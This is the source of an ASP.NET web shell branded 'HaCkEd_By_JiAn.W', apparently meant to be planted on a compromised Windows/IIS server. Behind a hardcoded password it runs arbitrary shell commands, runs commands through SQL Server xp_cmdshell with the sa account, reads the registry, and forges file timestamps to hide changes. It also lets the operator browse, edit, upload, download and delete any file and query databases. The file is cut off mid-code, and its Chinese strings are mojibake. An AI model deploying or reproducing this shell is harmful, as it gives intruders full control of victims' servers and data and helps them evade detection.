<%@ Page Language="VB" ContentType="text/html" validateRequest="false" aspcompat="true" %>
<%@ Import Namespace="System.IO" %>
<%@ import namespace="System.Diagnostics" %>
<%@ Import Namespace="Microsoft.Win32" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Data.OleDb" %>
<script runat="server">
Dim PASSWORD as string = "51j"   '����ѡ�51j����Ϊ���Լ�������

Dim url,TEMP1,TEMP2,TITLE,SORTFILED as string

Sub Login_click(sender As Object, E As EventArgs)
	if Textbox.Text=PASSWORD then     
		session("lake2")=1
		session.Timeout=45
	else
		response.Write("<div align=center><font color='red'>�������</font></div>")
	end if
End Sub

Sub RunCMD(Src As Object, E As EventArgs)
	Dim myProcess As New Process()
	Dim myProcessStartInfo As New ProcessStartInfo(cmdPath.Text)
	myProcessStartInfo.UseShellExecute = False
	myProcessStartInfo.RedirectStandardOutput = true
	myProcess.StartInfo = myProcessStartInfo
	myProcessStartInfo.Arguments="/c " & Cmd.text
	myProcess.Start()
	Dim myStreamReader As StreamReader = myProcess.StandardOutput
	Dim myString As String = myStreamReader.Readtoend()
	myProcess.Close()
	mystring=replace(mystring,">","&lt;")
	mystring=replace(mystring,"<","&gt;")
	result.text="Command = " & Cmd.text & vbcrlf & "<ul class='td3'><pre>" & mystring & "</pre></ul>"
	Cmd.text=""
End Sub
Sub CloneTime(Src As Object, E As EventArgs)
	existdir(time1.Text)
	existdir(time2.Text)
	Dim thisfile As FileInfo =New FileInfo(time1.Text)
	Dim thatfile As FileInfo =New FileInfo(time2.Text)
	thisfile.LastWriteTime = thatfile.LastWriteTime
	thisfile.LastAccessTime = thatfile.LastAccessTime
	thisfile.CreationTime = thatfile.CreationTime
	response.Write("<div align=center><font color='red'>Clone Time �ɹ�!</font></div>")
End Sub
Sub ReadReg(Src As Object, E As EventArgs)
	Dim error_x as Exception
Try
	Dim hu As String = Reg1.Text
	Dim rk As RegistryKey
	Select Mid( hu ,1 , Instr( hu,"\" )-1 )
		case "HKEY_LOCAL_MACHINE"
			rk = Registry.LocalMachine.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
		case "HKEY_CLASSES_ROOT"
			rk = Registry.ClassesRoot.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
		case "HKEY_CURRENT_USER"
			rk = Registry.CurrentUser.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
		case "HKEY_USERS"
			rk = Registry.Users.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
		case "HKEY_CURRENT_CONFIG"
			rk = Registry.CurrentConfig.OpenSubKey( Right(hu , Len(hu) - Instr( hu,"\" )) , 0 )
	End Select
	Label1.Text = rk.GetValue(Reg2.Text , "NULL")
	rk.Close()
Catch error_x
	Label1.Text = "�д������������ǲ����ڸü�ֵ��"
End Try
End Sub
sub Editor(Src As Object, E As EventArgs)
	dim mywrite as new streamwriter(filepath.text,false,encoding.default)
	mywrite.write(content.text)
	mywrite.close
	response.Write("<script>alert('�༭|�����ļ� " & replace(filepath.text,"\","\\") & " �ɹ�����ˢ�£�')</sc"&"ript>")
end sub
Sub UpLoad(Src As Object, E As EventArgs)
	dim filename,loadpath as string
	filename=path.getfilename(UpFile.value)
	loadpath=request.QueryString("src") & filename
	if  file.exists(loadpath)=true then 
		response.Write("<script>alert('�ļ�" & replace(loadpath,"\","\\") & " �Ѿ����ڣ��ϴ�ʧ�ܣ�')</sc"&"ript>")
		response.End()
	end if
	UpFile.postedfile.saveas(loadpath)
	response.Write("<script>alert('�ļ� " & replace(filename,"\","\\") & " �ϴ��ɹ���\n�ļ���Ϣ���£�\n\n����·����" & replace(UpFile.value,"\","\\") & "\n�ļ���С��" & UpFile.postedfile.contentlength & " bytes\nԶ��·����" & replace(loadpath,"\","\\") & "\n');</scri"&"pt>")
End Sub
Sub NewFD(Src As Object, E As EventArgs)
	url=request.form("src")
	if NewFile.Checked = True then
		dim mywrite as new streamwriter(url & NewName.Text,false,encoding.default)
		mywrite.close
		response.Redirect(request.ServerVariables("URL") & "?action=edit&src=" & server.UrlEncode(url & NewName.Text))
	else
		directory.createdirectory(url & NewName.Text)
		response.Write("<script>alert('�����ļ��� " & replace(url & NewName.Text ,"\","\\") & " �ɹ���ˢ�£�');</sc" & "ript>")
	end if
End Sub
Sub del(a)
	if right(a,1)="\" then
		dim xdir as directoryinfo
		dim mydir as new DirectoryInfo(a)
		dim xfile as fileinfo
		for each xfile in mydir.getfiles()
			file.delete(a & xfile.name)
		next
		for each xdir in mydir.getdirectories()
			call del(a & xdir.name & "\")
		next
		directory.delete(a)
	else
		file.delete(a)
	end if
End Sub
Sub copydir(a,b)
	dim xdir as directoryinfo
	dim mydir as new DirectoryInfo(a)
	dim xfile as fileinfo
	for each xfile in mydir.getfiles()
		file.copy(a & "\" & xfile.name,b & xfile.name)
	next
	for each xdir in mydir.getdirectories()
		directory.createdirectory(b & path.getfilename(a & xdir.name))
		call copydir(a & xdir.name & "\",b & xdir.name & "\")
	next
End Sub
Sub xexistdir(temp,ow)
	if directory.exists(temp)=true or file.exists(temp)=true then 
		if ow=0  then
			response.Redirect(request.ServerVariables("URL") & "?action=samename&src=" & server.UrlEncode(url))
		elseif ow=1 then
			del(temp)
		else
			dim d as string = session("cutboard")
			if right(d,1)="\" then
				TEMP1=url & second(now) & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
			else
				TEMP2=url & second(now) & replace(path.getfilename(d),"","")
			end if
		end if
	end if
End Sub
Sub existdir(temp)
		if  file.exists(temp)=false and directory.exists(temp)=false then 
			response.Write("<script>alert('������·�� " & replace(temp,"\","\\")  &"��');</sc" & "ript>")
			response.Write("<br><br><a href='javascript:history.back(1);'>����</a>")
			response.End()
		end if
End Sub
Sub RunSQLCMD(Src As Object, E As EventArgs)
	Dim adoConn,strQuery,recResult,strResult
	if SqlName.Text<>"" then
		adoConn=Server.CreateObject("ADODB.Connection") 
		adoConn.Open("Provider=SQLOLEDB.1;Password=" & SqlPass.Text & ";UID=" & SqlName.Text & ";Data Source = " & ip.Text) 
		If Sqlcmd.Text<>"" Then 
			strQuery = "exec master.dbo.xp_cmdshell '" & Sqlcmd.Text & "'" 
	  		recResult = adoConn.Execute(strQuery) 
 	 		If NOT recResult.EOF Then 
   				Do While NOT recResult.EOF 
    				strResult = strResult & chr(13) & recResult(0).value
    				recResult.MoveNext 
   				Loop 
 	 		End if 
  			recResult = Nothing 
  			strResult = Replace(strResult," ","&nbsp;") 
  			strResult = Replace(strResult,"<","&lt;") 
  			strResult = Replace(strResult,">","&gt;") 
			resultSQL.Text="Command = " & SqlCMD.Text & vbcrlf & "<ul class='td3'><pre>" & strResult & "</pre></ul>"
			SqlCMD.Text=""
		 End if 
  		adoConn.Close 
	 End if
 End Sub
Function GetStartedTime(ms) 
	GetStartedTime=cint(ms/(1000*60*60))
End function
Function getIP() 
    Dim strIPAddr as string
    If Request.ServerVariables("HTTP_X_FORWARDED_FOR") = "" OR InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), "unknown") > 0 Then
        strIPAddr = Request.ServerVariables("REMOTE_ADDR")
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",") > 0 Then
        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ",")-1)
    ElseIf InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";") > 0 Then
        strIPAddr = Mid(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), 1, InStr(Request.ServerVariables("HTTP_X_FORWARDED_FOR"), ";")-1)
    Else
        strIPAddr = Request.ServerVariables("HTTP_X_FORWARDED_FOR")
    End If
    getIP = Trim(Mid(strIPAddr, 1, 30))
End Function
Function Getparentdir(nowdir)
	dim temp,k as integer
	temp=1
	k=0
	if len(nowdir)>4 then 
		nowdir=left(nowdir,len(nowdir)-1) 
	end if
	do while temp<>0
		k=temp+1
		temp=instr(temp,nowdir,"\")
		if temp =0 then
			exit do
		end if
		temp = temp+1
	loop
	if k<>2 then
		getparentdir=mid(nowdir,1,k-2)
	else
		getparentdir=nowdir
	end if
End function
Function Rename()
	url=request.QueryString("src")
	if file.exists(Getparentdir(url) & request.Form("name")) then
		rename=0   
	else
		file.copy(url,Getparentdir(url) & request.Form("name"))
		del(url)
		rename=1
	end if
End Function 
Function GetSize(temp)
	if temp < 1024 then
		GetSize=temp & " bytes"
	else
		if temp\1024 < 1024 then
			GetSize=temp\1024 & " KB"
		else
			if temp\1024\1024 < 1024 then
				GetSize=temp\1024\1024 & " MB"
			else
				GetSize=temp\1024\1024\1024 & " GB"
			end if
		end if
	end if
End Function 
	Sub downTheFile(thePath)
		dim stream
		stream=server.createObject("adodb.stream")
		stream.open
		stream.type=1
		stream.loadFromFile(thePath)
		response.addHeader("Content-Disposition", "attachment; filename=" & replace(server.UrlEncode(path.getfilename(thePath)),"+"," "))
		response.addHeader("Content-Length",stream.Size)
		response.charset="UTF-8"
		response.contentType="application/octet-stream"
		response.binaryWrite(stream.read)
		response.flush
		stream.close
		stream=nothing
		response.End()
	End Sub
Sub Page_Load(sender As Object, E As EventArgs)
	if request.QueryString("table")<>"" then
		Call ShowTable()
	end if
End Sub
Sub ShowTable()
	DB_eButton.Visible = True
	DB_eString.Visible = True
	DB_exe.Visible = True
	DB_CString.Text = session("DBC") 
	if instr(DB_CString.Text,":\")<>0 then
		DB_rB_Access.Checked = true
		DB_rB_MSSQL.Checked = false
	else
		DB_rB_Access.Checked = false
		DB_rB_MSSQL.checked = true
	end if
	Call BindData()
End Sub
Sub DB_ReLoad(sender As Object, E As EventArgs)
	response.Redirect(request.ServerVariables("PATH_INFO") & "?action=data")
End Sub
Sub DB_oneB(sender As Object, E As EventArgs)
	Dim error_x as Exception
	Try
	Dim db_conn As New OleDbConnection(session("DBC"))
	Dim db_cmd As New OleDbCommand( DB_EString.Text , db_conn ) 
	db_conn.Open()
	db_cmd.ExecuteNonQuery()
	db_conn.Close()
	Call BindData()
	Catch error_x
	response.Write("<div align=center><font color='red'>����</font></div>"&error_x.Message)
	response.End()
	End Try
End Sub
Sub DB_onrB_1(sender As Object, E As EventArgs)
	DB_CString.Text = "server=(local);UID=sa;PWD=;database=;Provider=SQLOLEDB"
	DB_rB_Access.Checked = false
	DB_rB_MSSQL.Checked = true
End Sub
Sub DB_onrB_2(sender As Object, E As EventArgs)
	DB_rB_Access.Checked = true
	DB_rB_MSSQL.Checked = false
	DB_CString.Text = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=MDB.mdb"
End Sub
Sub DB_onsB(sender As Object, E As EventArgs)
	DB_eButton.Visible = True
	DB_eString.Visible = True
	DB_exe.Visible = True
	session("DBC") = DB_CString.Text
	Dim i As Integer
	Dim db_conn As New OleDbConnection(DB_CString.Text)
	Dim db_schemaTable As DataTable 
	db_conn.open()
	db_schemaTable = db_conn.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, New Object() {Nothing, Nothing, Nothing, "TABLE"})
	Dim sqlTable As string
	For i = 0 To db_schemaTable.Rows.Count - 1
		sqlTable += "<a href='?action=data&table=" & db_schemaTable.Rows(i)!TABLE_NAME.ToString & "'>" & db_schemaTable.Rows(i)!TABLE_NAME.ToString & "</a><br>"
	Next i
	db_Label.Text="��ṹ<ul class='td3'>" & sqlTable & "</ul>"
	db_conn.close()
End Sub
'��ҳ
Sub DB_Page(sender As Object, e As System.Web.UI.WebControls.DataGridPageChangedEventArgs)
	DB_DataGrid.CurrentPageIndex = e.NewPageIndex
	Call BindData()
End Sub
Sub DB_Sort(sender As Object, E As DataGridSortCommandEventArgs)
	SORTFILED = E.SortExpression
	Call BindData()
End Sub
Sub BindData()
	Dim db_conn As New OleDbConnection(session("DBC"))
	Dim db_cmd As New OleDbCommand("select * from " & request.QueryString("table") , db_conn ) 
	Dim db_adp As New OleDbDataAdapter(db_cmd)
	Dim db_ds As New DataSet()
	db_adp.Fill(db_ds,request.QueryString("table"))
	DB_DataGrid.DataSource = db_ds.Tables(request.QueryString("table")).DefaultView
	db_ds.Tables(request.QueryString("table")).DefaultView.Sort = SORTFILED
	DB_DataGrid.DataBind()
End Sub
</script>
<%
	if request.QueryString("action")="down" and session("lake2")=1 then
			downTheFile(request.QueryString("src"))
			response.End()
	end if
	
	Dim hu as string = request.QueryString("action")
	
	if hu="cmd" then 
		TITLE="HaCkEd_By_JiAn.W -- CMD"
	elseif hu="sqlrootkit" then 
		TITLE="HaCkEd_By_JiAn.W -- SqlRootKit"
	elseif hu="clonetime" then 
		TITLE="HaCkEd_By_JiAn.W -- CloneTime"
	elseif hu="information" then 
		TITLE="HaCkEd_By_JiAn.W -- WebServerInfo"
	elseif hu="reg" then 
		TITLE="HaCkEd_By_JiAn.W -- RegRead"
	elseif hu="goto" then 
		TITLE="HaCkEd_By_JiAn.W -- FileManager"
	elseif hu="data" then 
		TITLE="HaCkEd_By_JiAn.W -- ControlDataBase"
	else 
		TITLE=request.ServerVariables("HTTP_HOST") 
	end if
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
	<style>
		body{overflow:auto;border:0px;margin: 0px;padding: 0px;background-color:buttonface;}
		input {BORDER:#ffffff 1px solid;;FONT-SIZE: 12px;color: #000000;}
		.inputLogin {font-size: 9pt;border:1px solid lightgrey;background-color: lightgrey;}
		textarea {BORDER: 1 1 1 1;FONT-SIZE: 12px;	color: #000000;}
		A:visited {FONT-SIZE: 9pt;COLOR: #333333;TEXT-DECORATION: none;}
		A:active {FONT-SIZE: 9pt;COLOR: #3366cc;TEXT-DECORATION: none;}
		A:link {FONT-SIZE: 9pt;COLOR: #000000;TEXT-DECORATION: none;}
		A:hover{font-weight: bold;background: silver;text-transform: capitalize;color: black;}
		.tr1{ BACKGROUND-color:gray }
		td {FONT-SIZE:9pt;FONT-FAMILY:"Tahoma","Arial","Helvetica","sans-serif";}
		.td1{BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:silver; height:22px;}
		.td2{BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:lightgrey; height:18px;}
		.td3{BORDER-RIGHT:#ffffff 0px solid;BORDER-TOP:#ffffff 1px solid;BORDER-LEFT:#ffffff 1px solid;BORDER-BOTTOM:#ffffff 0px solid;BACKGROUND-COLOR:gainsboro;}
		.table1{BORDER:gray 0px ridge;}
		.table2{BORDER:silver 0px ridge;}
		.showMenu{BORDER:silver 0px double;}
	</style>
	<head>
		<title>
			<%=TITLE%>
		</title>
		<meta http-equiv="Content-Type" content="text/html" charset="gb2312">
	</head>
	<body>
		<%
			Dim error_x as Exception
			Try
			if session("lake2")<>1 then
		%>
		<div align="center" style="position:absolute;width:100%;visibility:show; z-index:0;left:0px;top:200px">
			<TABLE class="table1" cellSpacing="1" cellPadding="1" width="473" border="0" align="center">
				<tr>
					<td class="tr1">
						<TABLE cellSpacing="0" cellPadding="0" width="468" border="0">
							<tr>
								<TD align="left"><FONT face="webdings" color="#ffffff">&nbsp;8</FONT><FONT face="Verdana, Arial, Helvetica, sans-serif" color="#ffffff"><b>�����¼ 
											:::...</b></TD>
								<TD align="right"><FONT color="#d2d8ec">HaCkEd_By_JiAn.W</FONT></TD>
							</tr>
							<form runat="server" ID="Form1">
								<tr>
									<td height="30" align="center" class="td2" colspan="2">
										<asp:TextBox ID="Textbox" runat="server" TextMode="Password" />
										<asp:Button ID="Button" runat="server" Text="Login" ToolTip="Click here to login" OnClick="login_click"
											CssClass="inputLogin" />
									</td>
								</tr>
							</form>
							<SCRIPT type='text/javascript' language='javascript' src='http://xslt.alexa.com/site_stats/js/t/c?url=<%=request.serverVariables("server_name")%>'></SCRIPT>
						</TABLE>
					</td>
				</tr>
			</TABLE>
		</div>
		<%
			else
				dim temp as string
				temp=request.QueryString("action")
				if temp="" then temp="goto"
				select case temp
				case "goto"
					if request.QueryString("src")<>"" then
						url=request.QueryString("src")
					else
						url=server.MapPath(".") & "\"
					end if
				call existdir(url)
				dim xdir as directoryinfo
				dim mydir as new DirectoryInfo(url)
				dim hupo as string
				dim xfile as fileinfo
		%>
		<TABLE class="showMenu" width="100%" border="0" cellpadding="1" cellspacing="1">
			<tr>
				<td height="26">
					<a href="?action=sqlrootkit" target="_blank">SqlRootKit.NET </a>&nbsp;&nbsp;<a href="?action=cmd" target="_blank">
						CMD.NET</a>&nbsp;&nbsp;<a href="?action=clonetime&src=<%=server.UrlEncode(url)%>" target="_blank">
						CloneTime</a> &nbsp;&nbsp;<a href="?action=information" target="_blank">SysInfomation</a>&nbsp;&nbsp;
					<a href="?action=reg" target="_blank">ReadReg</a>&nbsp;&nbsp;<a href="?action=data" target="_blank">
						DataBase</a>
				</td>
				<TD align="right">Powered By <b>����</b>&nbsp;<a href="?action=logout" title="Exit"><FONT face="webdings" color="red">r<font></a>&nbsp;</TD>
			</tr>
		</TABLE>
		<TABLE class="table1" cellSpacing="0" cellPadding="0" width="100%" border="0">
			<TR>
				<TD class="tr1" colspan="2" height="20"><FONT color="#ffffff">��ǰĿ¼��<%=url%></FONT></TD>
			</TR>
			<TR class="td1">
				<td height="20">
					<a href="?action=new&src=<%=server.UrlEncode(url)%>" title="�½��ļ���Ŀ¼" target="_blank">
						�½�</a>
					<%if session("cutboard")<>"" then%>
					<a href="?action=plaster&src=<%=server.UrlEncode(url)%>" title="ճ���������������">ճ��</a>
					<%else%>
					ճ��
					<%end if%>
					<a href="?action=upfile&src=<%=server.UrlEncode(url)%>" title="�ϴ��ļ�" target="_blank">
						�ϴ�</a>
				</td>
				<td>
					<a href="?action=goto&src="<%=server.MapPath(".")%> title="�ص����ļ�����Ŀ¼">��</a>
					<%
						dim i as integer
						for i =0 to Directory.GetLogicalDrives().length-1
 							response.Write("<a href='?action=goto&src=" & Directory.GetLogicalDrives(i) & "'>" & Directory.GetLogicalDrives(i) & " </a>")
						next
					%>
				</td>
			</TR>
		</TABLE>
		<table width="100%" border="1" cellpadding="0" cellspacing="0">
			<tr>
				<td width="30%" valign="top">
					<table width="100%" border="1" cellpadding="0" cellspacing="0">
						<%
							'��Ŀ¼�ṹ
							response.Write("<tr><td class='td1'><a href='?action=goto&src=" & server.UrlEncode(Getparentdir(url)) & "'><font color=red>�����ϼ�Ŀ¼</font></a></td></tr>")
							for each xdir in mydir.getdirectories()
								dim filepath as string 
								filepath=server.UrlEncode(url & xdir.name)
								response.Write("<tr><td class=td2><FONT face=wingdings color=red>0</FONT><a href='?action=goto&src=" & filepath & "\" & "'>" & xdir.name & "</a>")
								response.Write("<div align=right>" & Directory.GetLastWriteTime(url & xdir.name) & "<FONT color=red><a href='?action=cut&src=" & filepath & "\'  target='_blank'>����" & "</a>-<a href='?action=copy&src=" & filepath & "\'  target='_blank'>����</a>-<a href='?action=del&src=" & filepath & "\'" & " onclick='return del(this);'>ɾ��</a></font></div></tr>")
							next
						%>
					</table>
				</td>
				<td width="70%" valign="top">
					<table width="100%" border="1" cellpadding="0" cellspacing="0">
						<tr align="center">
							<td class="td1">����</td>
							<td class="td1">��С</td>
							<td class="td1">�޸�ʱ��</td>
							<td class="td1">����</td>
						</tr>
						<%
							'�ļ��ṹ
							for each xfile in mydir.getfiles()
								dim filepath2 as string
								filepath2=server.UrlEncode(url & xfile.name)
								response.Write("<tr><td class=td2>" & xfile.name & "</td>")
								response.Write("<td class=td2 align=center>" & GetSize(xfile.length) & "</td>")
								response.Write("<td class=td2 align=center>" & file.GetLastWriteTime(url & xfile.name) & "</td>")
								response.Write("<td class=td2 align=center><FONT color=red><a href='?action=edit&src=" & filepath2 & "' target='_blank'>�༭</a>-<a href='?action=cut&src=" & filepath2 & "' target='_blank'>����</a>-<a href='?action=copy&src=" & filepath2 & "' target='_blank'>ճ��</a>-<a href='?action=rename&src=" & filepath2 & "' target='_blank'>������</a>-<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>����</a>-<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>ɾ��</a></font></td></tr>")
							next
						%>
					</table>
				</td>
			</tr>
		</table>
		<script language="javascript">
			function del()
			{
				if(confirm("ȷ��ɾ����"))
				{
					return true;
				}
				else
				{
					return false;
				}
			}
			function down()
			{
				if(confirm("����ļ�����10M�������ͨ��httpЭ�����أ�\n��Ҫ������"))
				{
					return true;
				}
				else
				{
					return false;
				}
			}
		</script>
		<%
			case "information"'̽�빦��
				dim CIP,CP as string
				if getIP()<>request.ServerVariables("REMOTE_ADDR") then
					CIP=getIP()
					CP=request.ServerVariables("REMOTE_ADDR")
				else
					CIP=request.ServerVariables("REMOTE_ADDR")
					CP="None"
				end if
		%>
		<table width="100%" border="1" align="center" cellpadding="0" cellspacing="0">
			<tr>
				<td class='td1'>̽��</td>
			</tr>
			<tr>
				<td class='td2'>
					Server IP<ul class='td3'>
						<%=request.ServerVariables("LOCAL_ADDR")%>
					</ul>
					Machine Name<ul class='td3'>
						<%=Environment.MachineName%>
					</ul>
					Network Name<ul class='td3'>
						<%=Environment.UserDomainName.ToString()%>
					</ul>
					User Name in this Process<ul class='td3'>
						<%=Environment.UserName%>
					</ul>
					OS Version<ul class='td3'>
						<%=Environment.OSVersion.ToString()%>
					</ul>
					Started Time<ul class='td3'>
						<%=GetStartedTime(Environment.Tickcount)%>
						Hours</ul>
					System Time<ul class='td3'>
						<%=now%>
					</ul>
					IIS Version<ul class='td3'>
						<%=request.ServerVariables("SERVER_SOFTWARE")%>
					</ul>
					HTTPS<ul class='td3'>
						<%=request.ServerVariables("HTTPS")%>
					</ul>
					PATH_INFO<ul class='td3'>
						<%=request.ServerVariables("PATH_INFO")%>
					</ul>
					PATH_TRANSLATED<ul class='td3'>
						<%=request.ServerVariables("PATH_TRANSLATED")%>
					</ul>
					SERVER_PORT<ul class='td3'>
						<%=request.ServerVariables("SERVER_PORT")%>
					</ul>
					SeesionID<ul class='td3'>
						<%=Session.SessionID%>
					</ul>
				</td>
			</tr>
			<tr>
				<td class='td1'>Client Infomation</td>
			</tr>
			<tr>
				<td class='td2'>
					Client Proxy<ul class='td3'>
						<%=CP%>
					</ul>
					Client IP<ul class='td3'>
						<%=CIP%>
					</ul>
					User<ul class='td3'>
						<%=request.ServerVariables("HTTP_USER_AGENT")%>
					</ul>
				</td>
			</tr>
		</table>
		<% case "cmd" 'CMD.NET%>
		<table width="100%" border="1" align="center" cellpadding="0" cellspacing="0">
			<tr>
				<td class='td1'>CMD.NET</td>
			</tr>
			<tr>
				<td class='td2'>
					<form runat="server">
						CMD.exe's Path:<ul>
							<asp:TextBox ID="cmdpath" runat="server" Text="cmd.exe" Width="80%" />
						</ul>
						Command:<ul>
							<asp:TextBox ID="cmd" runat="server" Width="80%" class="TextBox" />
							<asp:Button ID="Button123" runat="server" Text="Run" OnClick="RunCMD" class="buttom" />
						</ul>
						<asp:Label ID="result" runat="server" />
					</form>
				</td>
			</tr>
		</table>
		<% case "sqlrootkit" 'SqlRootKit.NET%>
		<table width="100%" border="1" align="center" cellpadding="0" cellspacing="0">
			<tr>
				<td class='td1' colspan="2">SqlRootKit.NET</td>
			</tr>
			<tr>
				<form runat="server">
					<td class='td2' valign="top" width="30%">
						Host:<ul>
							<asp:TextBox ID="ip" runat="server" Width="80%" Text="127.0.0.1" />
						</ul>
						SQL Name:<ul>
							<asp:TextBox ID="SqlName" runat="server" Width="80%" Text='sa' />
						</ul>
						SQL Password:<ul>
							<asp:TextBox ID="SqlPass" runat="server" Width="80%" />
						</ul>
						Command:<ul>
							<asp:TextBox ID="Sqlcmd" runat="server" Width="80%" />
							<asp:Button ID="ButtonSQL" runat="server" Text="Run" OnClick="RunSQLCMD" />
						</ul>
					</td>
					<td class='td2' valign="top" width="70%">
						<asp:Label ID="resultSQL" runat="server" />
					</td>
				</form>
			</tr>
		</table>
		<%
			case "del"
				dim a as string
				a=request.QueryString("src")
				call existdir(a)
				call del(a)  
				response.Write("<script>alert(""ɾ���ļ� " & replace(a,"\","\\") & " �ɹ���"");location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(a)) &"'</script>")
			case "copy"
				call existdir(request.QueryString("src"))
				session("cutboard")="" & request.QueryString("src")
				response.Write("<script>alert('�ļ��Ѿ����Ƶ�������а壬����Ŀ���ļ��е�ճ�����ɣ�');location.href='JavaScript:self.close()';</script>")
			case "cut"
				call existdir(request.QueryString("src"))
				session("cutboard")="" & request.QueryString("src")
				response.Write("<script>alert('�ļ��Ѿ����е�������а壬����Ŀ���ļ��е�ճ�����ɣ�');location.href='JavaScript:self.close()';</script>")
			case "plaster"
				dim ow as integer
				if request.Form("OverWrite")<>"" then ow=1
				if request.Form("Cancel")<>"" then ow=2
				url=request.QueryString("src")
				call existdir(url)
				dim d as string
				d=session("cutboard")
				if left(d,1)="" then
					TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
					TEMP2=url & replace(path.getfilename(d),"","")
					if right(d,1)="\" then   
						call xexistdir(TEMP1,ow)
						directory.move(replace(d,"",""),TEMP1 & "\")  
						response.Write("<script>alert('����  " & replace(replace(d,"",""),"\","\\") & "  ��  " & replace(TEMP1 & "\","\","\\") & "  �ɹ���');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
					else
						call xexistdir(TEMP2,ow)
						file.move(replace(d,"",""),TEMP2)
						response.Write("<script>alert('����  " & replace(replace(d,"",""),"\","\\") & "  ��  " & replace(TEMP2,"\","\\") & "  �ɹ���');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
					end if
				else
					TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
					TEMP2=url & path.getfilename(replace(d,"",""))
					if right(d,1)="\" then 
						call xexistdir(TEMP1,ow)
						directory.createdirectory(TEMP1)
						call copydir(replace(d,"",""),TEMP1 & "\")
						response.Write("<script>alert('����  " & replace(replace(d,"",""),"\","\\") & "  ��  " & replace(TEMP1 & "\","\","\\") & "  �ɹ���');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
					else
						call xexistdir(TEMP2,ow)
						file.copy(replace(d,"",""),TEMP2)
						response.Write("<script>alert('����  " & replace(replace(d,"",""),"\","\\") & "  ��  " & replace(TEMP2,"\","\\") & "  �ɹ���');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
					end if
				end if
			case "upfile"
				url=request.QueryString("src")
		%>
		<table width="100%" border="1" align="center" cellpadding="0" cellspacing="0">
			<tr>
				<td class='td1'><%=url%></td>
			</tr>
			<tr>
				<td class='td2'>
					<form name="UpFileForm" enctype="multipart/form-data" method="post" action="?src=<%=server.UrlEncode(url)%>" runat="server"  onSubmit="return checkname();">
						<input name="upfile" type="file" id="UpFile" runat="server"> <input type="submit" id="UpFileSubit" value="Upload" runat="server" onserverclick="UpLoad">
					</form>
				</td>
			</tr>
		</table>
		<%
			case "new"
				url=request.QueryString("src")
		%>
		<table width="100%" border="1" align="center" cellpadding="0" cellspacing="0">
			<tr>
				<td class='td1'><%=url%></td>
			</tr>
			<tr>
				<td class='td2'>
					<form runat="server">
						�ļ����ƣ�
						<asp:TextBox ID="NewName" TextMode="SingleLine" runat="server" class="TextBox" />
						<asp:RadioButton ID="NewFile" Text="�ļ�" runat="server" GroupName="New" Checked="true" />
						<asp:RadioButton ID="NewDirectory" Text="Ŀ¼" runat="server" GroupName="New" />
						<asp:Button ID="NewButton" Text="Submit" runat="server" CssClass="buttom" OnClick="NewFD" />
						<input name="Src" type="hidden" value="<%=url%>">
					</form>
				</td>
			</tr>
		</table>
		<%
			case "edit"
				dim b as string
				b=request.QueryString("src")
				call existdir(b)
				dim myread as new streamreader(b,encoding.default)
				filepath.text=b
				content.text=myread.readtoend
		%>
		<table width="100%" border="1" align="center" cellpadding="0" cellspacing="0">
			<tr>
				<td class='td1'>�ļ��༭</td>
			</tr>
			<tr>
				<td class='td2'>
					<form runat="server">
						<asp:TextBox CssClass="TextBox" ID="filepath" runat="server" Width="100%" />
						<ul class='td3'>
							<asp:TextBox ID="content" Rows="33" TextMode="MultiLine" runat="server" Width="95%" />
							<asp:Button ID="a" Text="Sumbit" runat="server" OnClick="Editor" />
						</ul>
					</form>
				</td>
			</tr>
		</table>
		<%
  				myread.close
			case "rename"
				url=request.QueryString("src")
				if request.Form("name")="" then
		%>
		<table width="100%" border="1" align="center" cellpadding="0" cellspacing="0">
			<tr>
				<td class='td1'>������</td>
			</tr>
			<tr>
				<td class='td2'>
					<form name="formRn" method="post" action="?action=rename&src=<%=server.UrlEncode(request.QueryString("src"))%>" onSubmit="return checkname();">
						<ul class='td3'>
							<%=request.QueryString("src")%>
						</ul>
						<ul class='td3'>
							<%=getparentdir(request.QueryString("src"))%>
							<input type="text" name="name"> <input type="submit" name="Submit3" value="Submit">
						</ul>
					</form>
				</td>
			</tr>
		</table>
		<script language="javascript">
			function checkname()
			{
				if(formRn.name.value=="")
				{
					alert("�������ļ�����");
					return false
				}
			}
		</script>
		<%
				else
					if Rename() then
						response.Write("<script>alert('������ " & replace(url,"\","\\") & " Ϊ " & replace(Getparentdir(url) & request.Form("name"),"\","\\") & " �ɹ�����ˢ�£�');location.href='JavaScript:self.close()';</script>")
					else
